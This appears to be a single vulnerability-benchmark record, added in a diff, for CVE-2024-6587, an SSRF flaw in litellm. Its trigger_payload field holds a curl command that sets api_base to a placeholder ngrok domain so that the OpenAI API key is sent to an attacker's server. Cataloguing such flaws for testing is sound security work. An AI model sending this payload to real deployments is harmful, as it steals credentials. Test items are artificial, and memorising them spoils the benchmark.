@@ -1,0 +1,15 @@
+{
+  "file_id": "67_litellm_huntr_4001e1a2-7b7a-4776-a3ae-e6692ec3d997",
+  "numeric_id": "67",
+  "library_hint": "litellm",
+  "source": "huntr",
+  "title": "Server-Side Request Forgery (SSRF) allows attackers to steal OpenAI API keys by redirecting requests to malicious domains via the api_base parameter",
+  "cve": "CVE-2024-6587",
+  "cwe": "CWE-918: Server-Side Request Forgery (SSRF)",
+  "library": "litellm",
+  "affected_version": "<= 1.38.10",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X 'POST' 'http://0.0.0.0:4000/chat/completions' -H 'Content-Type: application/json' --data '{\"model\": \"gpt-3.5-turbo\", \"messages\": [{\"role\": \"user\",\"content\": \"hello\"}], \"api_base\": \"https://f000-000-00-00-00.ngrok-free.app\"}'",
+  "oracle": "The OpenAI API key is intercepted by the attacker's server (ngrok) when the request is sent to the malicious api_base domain."
+}
